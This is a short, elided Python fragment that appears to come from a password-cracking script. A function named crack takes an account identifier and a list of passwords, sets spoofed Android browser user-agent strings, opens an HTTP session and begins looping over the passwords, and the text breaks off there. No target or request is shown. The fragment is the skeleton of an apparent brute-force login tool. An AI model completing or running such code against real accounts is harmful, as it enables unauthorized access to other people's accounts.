...
def crack(idf,pwv):
	...
	ua = 'Mozilla/5.0 (Linux; Android 5.0.2; ASUS_Z00LDD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.166 Mobile Safari/537.36'
	ua2 = 'Mozilla/5.0 (Linux; Android 5.0.2; ASUS_Z00LDD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.166 Mobile Safari/537.36'
	ses = requests.Session()
	for pw in pwv:
		try:
